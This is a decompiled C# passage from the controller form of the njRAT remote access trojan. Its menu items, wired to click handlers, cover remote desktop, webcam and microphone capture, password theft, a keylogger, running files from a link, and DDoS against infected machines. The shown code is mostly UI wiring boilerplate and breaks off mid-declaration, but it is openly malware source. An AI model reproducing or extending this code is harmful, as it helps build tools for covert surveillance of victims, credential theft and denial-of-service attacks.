using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.My;
using NJRAT.njRAT;
using NJRAT.NJRAT;
using WinMM;

namespace NJRAT
{
	// Token: 0x02000011 RID: 17
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x06000167 RID: 359 RVA: 0x00152A98 File Offset: 0x00150E98
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form1.__ENCList;
			lock (_ENCList)
			{
				bool flag = Form1.__ENCList.Count == Form1.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Form1.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Form1.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Form1.__ENCList[num] = Form1.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num);
					Form1.__ENCList.Capacity = Form1.__ENCList.Count;
				}
				Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x0600016A RID: 362 RVA: 0x00156254 File Offset: 0x00154654
		// (set) Token: 0x0600016B RID: 363 RVA: 0x0015626C File Offset: 0x0015466C
		internal virtual StatusStrip StatusStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._StatusStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._StatusStrip1 = value;
			}
		}

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x0600016C RID: 364 RVA: 0x00156278 File Offset: 0x00154678
		// (set) Token: 0x0600016D RID: 365 RVA: 0x00156290 File Offset: 0x00154690
		internal virtual ToolStripStatusLabel ToolStripStatusLabel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripStatusLabel1_Click);
				bool flag = this._ToolStripStatusLabel1 != null;
				if (flag)
				{
					this._ToolStripStatusLabel1.Click -= eventHandler;
				}
				this._ToolStripStatusLabel1 = value;
				flag = this._ToolStripStatusLabel1 != null;
				if (flag)
				{
					this._ToolStripStatusLabel1.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000084 RID: 132
		// (get) Token: 0x0600016E RID: 366 RVA: 0x001562F0 File Offset: 0x001546F0
		// (set) Token: 0x0600016F RID: 367 RVA: 0x00156308 File Offset: 0x00154708
		internal virtual ToolStripStatusLabel ToolStripStatusLabel3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripStatusLabel3_Click);
				bool flag = this._ToolStripStatusLabel3 != null;
				if (flag)
				{
					this._ToolStripStatusLabel3.Click -= eventHandler;
				}
				this._ToolStripStatusLabel3 = value;
				flag = this._ToolStripStatusLabel3 != null;
				if (flag)
				{
					this._ToolStripStatusLabel3.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000085 RID: 133
		// (get) Token: 0x06000170 RID: 368 RVA: 0x00156368 File Offset: 0x00154768
		// (set) Token: 0x06000171 RID: 369 RVA: 0x00156380 File Offset: 0x00154780
		internal virtual ToolStripStatusLabel ToolStripStatusLabel5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripStatusLabel5_Click);
				bool flag = this._ToolStripStatusLabel5 != null;
				if (flag)
				{
					this._ToolStripStatusLabel5.Click -= eventHandler;
				}
				this._ToolStripStatusLabel5 = value;
				flag = this._ToolStripStatusLabel5 != null;
				if (flag)
				{
					this._ToolStripStatusLabel5.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000086 RID: 134
		// (get) Token: 0x06000172 RID: 370 RVA: 0x001563E0 File Offset: 0x001547E0
		// (set) Token: 0x06000173 RID: 371 RVA: 0x001563F8 File Offset: 0x001547F8
		internal virtual ToolStripStatusLabel ToolStripStatusLabel4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripStatusLabel4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ToolStripStatusLabel4_Click);
				bool flag = this._ToolStripStatusLabel4 != null;
				if (flag)
				{
					this._ToolStripStatusLabel4.Click -= eventHandler;
				}
				this._ToolStripStatusLabel4 = value;
				flag = this._ToolStripStatusLabel4 != null;
				if (flag)
				{
					this._ToolStripStatusLabel4.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000087 RID: 135
		// (get) Token: 0x06000174 RID: 372 RVA: 0x00156458 File Offset: 0x00154858
		// (set) Token: 0x06000175 RID: 373 RVA: 0x00156470 File Offset: 0x00154870
		internal virtual ToolStripStatusLabel conz
		{
			[DebuggerNonUserCode]
			get
			{
				return this._conz;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._conz = value;
			}
		}

		// Token: 0x17000088 RID: 136
		// (get) Token: 0x06000176 RID: 374 RVA: 0x0015647C File Offset: 0x0015487C
		// (set) Token: 0x06000177 RID: 375 RVA: 0x00156494 File Offset: 0x00154894
		internal virtual ToolStripStatusLabel upl
		{
			[DebuggerNonUserCode]
			get
			{
				return this._upl;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._upl = value;
			}
		}

		// Token: 0x17000089 RID: 137
		// (get) Token: 0x06000178 RID: 376 RVA: 0x001564A0 File Offset: 0x001548A0
		// (set) Token: 0x06000179 RID: 377 RVA: 0x001564B8 File Offset: 0x001548B8
		internal virtual ToolStripStatusLabel dwn
		{
			[DebuggerNonUserCode]
			get
			{
				return this._dwn;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._dwn = value;
			}
		}

		// Token: 0x1700008A RID: 138
		// (get) Token: 0x0600017A RID: 378 RVA: 0x001564C4 File Offset: 0x001548C4
		// (set) Token: 0x0600017B RID: 379 RVA: 0x001564DC File Offset: 0x001548DC
		internal virtual ContextMenuStrip ContextMenuStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip1 = value;
			}
		}

		// Token: 0x1700008B RID: 139
		// (get) Token: 0x0600017C RID: 380 RVA: 0x001564E8 File Offset: 0x001548E8
		// (set) Token: 0x0600017D RID: 381 RVA: 0x00156500 File Offset: 0x00154900
		internal virtual ToolStripMenuItem ManagerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ManagerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ManagerToolStripMenuItem_Click);
				bool flag = this._ManagerToolStripMenuItem != null;
				if (flag)
				{
					this._ManagerToolStripMenuItem.Click -= eventHandler;
				}
				this._ManagerToolStripMenuItem = value;
				flag = this._ManagerToolStripMenuItem != null;
				if (flag)
				{
					this._ManagerToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700008C RID: 140
		// (get) Token: 0x0600017E RID: 382 RVA: 0x00156560 File Offset: 0x00154960
		// (set) Token: 0x0600017F RID: 383 RVA: 0x00156578 File Offset: 0x00154978
		internal virtual ToolStripMenuItem RunFileToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RunFileToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._RunFileToolStripMenuItem = value;
			}
		}

		// Token: 0x1700008D RID: 141
		// (get) Token: 0x06000180 RID: 384 RVA: 0x00156584 File Offset: 0x00154984
		// (set) Token: 0x06000181 RID: 385 RVA: 0x0015659C File Offset: 0x0015499C
		internal virtual ToolStripMenuItem FromLinkToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromLinkToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.FromLinkToolStripMenuItem_Click);
				bool flag = this._FromLinkToolStripMenuItem != null;
				if (flag)
				{
					this._FromLinkToolStripMenuItem.Click -= eventHandler;
				}
				this._FromLinkToolStripMenuItem = value;
				flag = this._FromLinkToolStripMenuItem != null;
				if (flag)
				{
					this._FromLinkToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700008E RID: 142
		// (get) Token: 0x06000182 RID: 386 RVA: 0x001565FC File Offset: 0x001549FC
		// (set) Token: 0x06000183 RID: 387 RVA: 0x00156614 File Offset: 0x00154A14
		internal virtual ToolStripMenuItem FromDiskToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromDiskToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.FromDiskToolStripMenuItem_Click);
				bool flag = this._FromDiskToolStripMenuItem != null;
				if (flag)
				{
					this._FromDiskToolStripMenuItem.Click -= eventHandler;
				}
				this._FromDiskToolStripMenuItem = value;
				flag = this._FromDiskToolStripMenuItem != null;
				if (flag)
				{
					this._FromDiskToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700008F RID: 143
		// (get) Token: 0x06000184 RID: 388 RVA: 0x00156674 File Offset: 0x00154A74
		// (set) Token: 0x06000185 RID: 389 RVA: 0x0015668C File Offset: 0x00154A8C
		internal virtual ToolStripMenuItem ScriptToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ScriptToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.ScriptToolStripMenuItem_Click);
				bool flag = this._ScriptToolStripMenuItem != null;
				if (flag)
				{
					this._ScriptToolStripMenuItem.Click -= eventHandler;
				}
				this._ScriptToolStripMenuItem = value;
				flag = this._ScriptToolStripMenuItem != null;
				if (flag)
				{
					this._ScriptToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000090 RID: 144
		// (get) Token: 0x06000186 RID: 390 RVA: 0x001566EC File Offset: 0x00154AEC
		// (set) Token: 0x06000187 RID: 391 RVA: 0x00156704 File Offset: 0x00154B04
		internal virtual ToolStripMenuItem RemoteDesktopToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoteDesktopToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RemoteDesktopToolStripMenuItem_Click);
				bool flag = this._RemoteDesktopToolStripMenuItem != null;
				if (flag)
				{
					this._RemoteDesktopToolStripMenuItem.Click -= eventHandler;
				}
				this._RemoteDesktopToolStripMenuItem = value;
				flag = this._RemoteDesktopToolStripMenuItem != null;
				if (flag)
				{
					this._RemoteDesktopToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000091 RID: 145
		// (get) Token: 0x06000188 RID: 392 RVA: 0x00156764 File Offset: 0x00154B64
		// (set) Token: 0x06000189 RID: 393 RVA: 0x0015677C File Offset: 0x00154B7C
		internal virtual ToolStripMenuItem RemoteCamToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RemoteCamToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RemoteCamToolStripMenuItem_Click);
				bool flag = this._RemoteCamToolStripMenuItem != null;
				if (flag)
				{
					this._RemoteCamToolStripMenuItem.Click -= eventHandler;
				}
				this._RemoteCamToolStripMenuItem = value;
				flag = this._RemoteCamToolStripMenuItem != null;
				if (flag)
				{
					this._RemoteCamToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000092 RID: 146
		// (get) Token: 0x0600018A RID: 394 RVA: 0x001567DC File Offset: 0x00154BDC
		// (set) Token: 0x0600018B RID: 395 RVA: 0x001567F4 File Offset: 0x00154BF4
		internal virtual ToolStripMenuItem MicrophoneToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MicrophoneToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.MicrophoneToolStripMenuItem_Click);
				bool flag = this._MicrophoneToolStripMenuItem != null;
				if (flag)
				{
					this._MicrophoneToolStripMenuItem.Click -= eventHandler;
				}
				this._MicrophoneToolStripMenuItem = value;
				flag = this._MicrophoneToolStripMenuItem != null;
				if (flag)
				{
					this._MicrophoneToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000093 RID: 147
		// (get) Token: 0x0600018C RID: 396 RVA: 0x00156854 File Offset: 0x00154C54
		// (set) Token: 0x0600018D RID: 397 RVA: 0x0015686C File Offset: 0x00154C6C
		internal virtual ToolStripMenuItem GetPasswordsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GetPasswordsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GetPasswordsToolStripMenuItem = value;
			}
		}

		// Token: 0x17000094 RID: 148
		// (get) Token: 0x0600018E RID: 398 RVA: 0x00156878 File Offset: 0x00154C78
		// (set) Token: 0x0600018F RID: 399 RVA: 0x00156890 File Offset: 0x00154C90
		internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KeyloggerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.KeyloggerToolStripMenuItem_Click);
				bool flag = this._KeyloggerToolStripMenuItem != null;
				if (flag)
				{
					this._KeyloggerToolStripMenuItem.Click -= eventHandler;
				}
				this._KeyloggerToolStripMenuItem = value;
				flag = this._KeyloggerToolStripMenuItem != null;
				if (flag)
				{
					this._KeyloggerToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000095 RID: 149
		// (get) Token: 0x06000190 RID: 400 RVA: 0x001568F0 File Offset: 0x00154CF0
		// (set) Token: 0x06000191 RID: 401 RVA: 0x00156908 File Offset: 0x00154D08
		internal virtual ToolStripMenuItem OpenChatToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenChatToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.OpenChatToolStripMenuItem_Click);
				bool flag = this._OpenChatToolStripMenuItem != null;
				if (flag)
				{
					this._OpenChatToolStripMenuItem.Click -= eventHandler;
				}
				this._OpenChatToolStripMenuItem = value;
				flag = this._OpenChatToolStripMenuItem != null;
				if (flag)
				{
					this._OpenChatToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000096 RID: 150
		// (get) Token: 0x06000192 RID: 402 RVA: 0x00156968 File Offset: 0x00154D68
		// (set) Token: 0x06000193 RID: 403 RVA: 0x00156980 File Offset: 0x00154D80
		internal virtual ToolStripMenuItem ServerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ServerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ServerToolStripMenuItem = value;
			}
		}

		// Token: 0x17000097 RID: 151
		// (get) Token: 0x06000194 RID: 404 RVA: 0x0015698C File Offset: 0x00154D8C
		// (set) Token: 0x06000195 RID: 405 RVA: 0x001569A4 File Offset: 0x00154DA4
		internal virtual ToolStripMenuItem UpdateToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UpdateToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._UpdateToolStripMenuItem = value;
			}
		}

		// Token: 0x17000098 RID: 152
		// (get) Token: 0x06000196 RID: 406 RVA: 0x001569B0 File Offset: 0x00154DB0
		// (set) Token: 0x06000197 RID: 407 RVA: 0x001569C8 File Offset: 0x00154DC8
		internal virtual ToolStripMenuItem FromDISKToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromDISKToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.FromDISKToolStripMenuItem1_Click);
				bool flag = this._FromDISKToolStripMenuItem1 != null;
				if (flag)
				{
					this._FromDISKToolStripMenuItem1.Click -= eventHandler;
				}
				this._FromDISKToolStripMenuItem1 = value;
				flag = this._FromDISKToolStripMenuItem1 != null;
				if (flag)
				{
					this._FromDISKToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x17000099 RID: 153
		// (get) Token: 0x06000198 RID: 408 RVA: 0x00156A28 File Offset: 0x00154E28
		// (set) Token: 0x06000199 RID: 409 RVA: 0x00156A40 File Offset: 0x00154E40
		internal virtual ToolStripMenuItem FromLINKToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromLINKToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.FromLINKToolStripMenuItem1_Click);
				bool flag = this._FromLINKToolStripMenuItem1 != null;
				if (flag)
				{
					this._FromLINKToolStripMenuItem1.Click -= eventHandler;
				}
				this._FromLINKToolStripMenuItem1 = value;
				flag = this._FromLINKToolStripMenuItem1 != null;
				if (flag)
				{
					this._FromLINKToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700009A RID: 154
		// (get) Token: 0x0600019A RID: 410 RVA: 0x00156AA0 File Offset: 0x00154EA0
		// (set) Token: 0x0600019B RID: 411 RVA: 0x00156AB8 File Offset: 0x00154EB8
		internal virtual ToolStripMenuItem UninstallToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UninstallToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.UninstallToolStripMenuItem_Click);
				bool flag = this._UninstallToolStripMenuItem != null;
				if (flag)
				{
					this._UninstallToolStripMenuItem.Click -= eventHandler;
				}
				this._UninstallToolStripMenuItem = value;
				flag = this._UninstallToolStripMenuItem != null;
				if (flag)
				{
					this._UninstallToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700009B RID: 155
		// (get) Token: 0x0600019C RID: 412 RVA: 0x00156B18 File Offset: 0x00154F18
		// (set) Token: 0x0600019D RID: 413 RVA: 0x00156B30 File Offset: 0x00154F30
		internal virtual ToolStripMenuItem RestartToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RestartToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RestartToolStripMenuItem_Click);
				bool flag = this._RestartToolStripMenuItem != null;
				if (flag)
				{
					this._RestartToolStripMenuItem.Click -= eventHandler;
				}
				this._RestartToolStripMenuItem = value;
				flag = this._RestartToolStripMenuItem != null;
				if (flag)
				{
					this._RestartToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700009C RID: 156
		// (get) Token: 0x0600019E RID: 414 RVA: 0x00156B90 File Offset: 0x00154F90
		// (set) Token: 0x0600019F RID: 415 RVA: 0x00156BA8 File Offset: 0x00154FA8
		internal virtual ToolStripMenuItem CloseToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CloseToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.CloseToolStripMenuItem_Click);
				bool flag = this._CloseToolStripMenuItem != null;
				if (flag)
				{
					this._CloseToolStripMenuItem.Click -= eventHandler;
				}
				this._CloseToolStripMenuItem = value;
				flag = this._CloseToolStripMenuItem != null;
				if (flag)
				{
					this._CloseToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700009D RID: 157
		// (get) Token: 0x060001A0 RID: 416 RVA: 0x00156C08 File Offset: 0x00155008
		// (set) Token: 0x060001A1 RID: 417 RVA: 0x00156C20 File Offset: 0x00155020
		internal virtual ToolStripMenuItem DisconnectToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DisconnectToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.DisconnectToolStripMenuItem_Click);
				bool flag = this._DisconnectToolStripMenuItem != null;
				if (flag)
				{
					this._DisconnectToolStripMenuItem.Click -= eventHandler;
				}
				this._DisconnectToolStripMenuItem = value;
				flag = this._DisconnectToolStripMenuItem != null;
				if (flag)
				{
					this._DisconnectToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700009E RID: 158
		// (get) Token: 0x060001A2 RID: 418 RVA: 0x00156C80 File Offset: 0x00155080
		// (set) Token: 0x060001A3 RID: 419 RVA: 0x00156C98 File Offset: 0x00155098
		internal virtual ToolStripMenuItem RenameToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._RenameToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.RenameToolStripMenuItem_Click);
				bool flag = this._RenameToolStripMenuItem != null;
				if (flag)
				{
					this._RenameToolStripMenuItem.Click -= eventHandler;
				}
				this._RenameToolStripMenuItem = value;
				flag = this._RenameToolStripMenuItem != null;
				if (flag)
				{
					this._RenameToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700009F RID: 159
		// (get) Token: 0x060001A4 RID: 420 RVA: 0x00156CF8 File Offset: 0x001550F8
		// (set) Token: 0x060001A5 RID: 421 RVA: 0x00156D10 File Offset: 0x00155110
		internal virtual ToolStripMenuItem OpenFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.OpenFolderToolStripMenuItem_Click);
				bool flag = this._OpenFolderToolStripMenuItem != null;
				if (flag)
				{
					this._OpenFolderToolStripMenuItem.Click -= eventHandler;
				}
				this._OpenFolderToolStripMenuItem = value;
				flag = this._OpenFolderToolStripMenuItem != null;
				if (flag)
				{
					this._OpenFolderToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000A0 RID: 160
		// (get) Token: 0x060001A6 RID: 422 RVA: 0x00156D70 File Offset: 0x00155170
		// (set) Token: 0x060001A7 RID: 423 RVA: 0x00156D88 File Offset: 0x00155188
		internal virtual ImageList IMG2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IMG2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IMG2 = value;
			}
		}

		// Token: 0x170000A1 RID: 161
		// (get) Token: 0x060001A8 RID: 424 RVA: 0x00156D94 File Offset: 0x00155194
		// (set) Token: 0x060001A9 RID: 425 RVA: 0x00156DAC File Offset: 0x001551AC
		internal virtual NotifyIcon NotifyIcon1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NotifyIcon1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				MouseEventHandler mouseEventHandler = new MouseEventHandler(this.NotifyIcon1_MouseDoubleClick);
				bool flag = this._NotifyIcon1 != null;
				if (flag)
				{
					this._NotifyIcon1.MouseDoubleClick -= mouseEventHandler;
				}
				this._NotifyIcon1 = value;
				flag = this._NotifyIcon1 != null;
				if (flag)
				{
					this._NotifyIcon1.MouseDoubleClick += mouseEventHandler;
				}
			}
		}

		// Token: 0x170000A2 RID: 162
		// (get) Token: 0x060001AA RID: 426 RVA: 0x00156E0C File Offset: 0x0015520C
		// (set) Token: 0x060001AB RID: 427 RVA: 0x00156E24 File Offset: 0x00155224
		internal virtual L1 L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				DataGridViewColumnEventHandler dataGridViewColumnEventHandler = new DataGridViewColumnEventHandler(this.L1_ColumnWidthChanged);
				bool flag = this._L1 != null;
				if (flag)
				{
					this._L1.ColumnWidthChanged -= dataGridViewColumnEventHandler;
				}
				this._L1 = value;
				flag = this._L1 != null;
				if (flag)
				{
					this._L1.ColumnWidthChanged += dataGridViewColumnEventHandler;
				}
			}
		}

		// Token: 0x170000A3 RID: 163
		// (get) Token: 0x060001AC RID: 428 RVA: 0x00156E84 File Offset: 0x00155284
		// (set) Token: 0x060001AD RID: 429 RVA: 0x00156E9C File Offset: 0x0015529C
		internal virtual Pp1 Pp1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Pp1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Pp1 = value;
			}
		}

		// Token: 0x170000A4 RID: 164
		// (get) Token: 0x060001AE RID: 430 RVA: 0x00156EA8 File Offset: 0x001552A8
		// (set) Token: 0x060001AF RID: 431 RVA: 0x00156EC0 File Offset: 0x001552C0
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Timer1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				bool flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick -= eventHandler;
				}
				this._Timer1 = value;
				flag = this._Timer1 != null;
				if (flag)
				{
					this._Timer1.Tick += eventHandler;
				}
			}
		}

		// Token: 0x170000A5 RID: 165
		// (get) Token: 0x060001B0 RID: 432 RVA: 0x00156F20 File Offset: 0x00155320
		// (set) Token: 0x060001B1 RID: 433 RVA: 0x00156F38 File Offset: 0x00155338
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000A6 RID: 166
		// (get) Token: 0x060001B2 RID: 434 RVA: 0x00156F98 File Offset: 0x00155398
		// (set) Token: 0x060001B3 RID: 435 RVA: 0x00156FB0 File Offset: 0x001553B0
		internal virtual ToolStripMenuItem OpenSitesToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenSitesToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.OpenSitesToolStripMenuItem_Click);
				bool flag = this._OpenSitesToolStripMenuItem != null;
				if (flag)
				{
					this._OpenSitesToolStripMenuItem.Click -= eventHandler;
				}
				this._OpenSitesToolStripMenuItem = value;
				flag = this._OpenSitesToolStripMenuItem != null;
				if (flag)
				{
					this._OpenSitesToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000A7 RID: 167
		// (get) Token: 0x060001B4 RID: 436 RVA: 0x00157010 File Offset: 0x00155410
		// (set) Token: 0x060001B5 RID: 437 RVA: 0x00157028 File Offset: 0x00155428
		internal virtual ToolStripMenuItem DDoSToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DDoSToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.DDoSToolStripMenuItem_Click);
				bool flag = this._DDoSToolStripMenuItem != null;
				if (flag)
				{
					this._DDoSToolStripMenuItem.Click -= eventHandler;
				}
				this._DDoSToolStripMenuItem = value;
				flag = this._DDoSToolStripMenuItem != null;
				if (flag)
				{
					this._DDoSToolStripMenuItem.Click += eventHandler;
				}
			}
		}

		// Token: 0x170000A8 RID: 168
		// (get) Token: 0x060001B6 RID: 438 RVA: 0x00157088 File Offset: 0x00155488
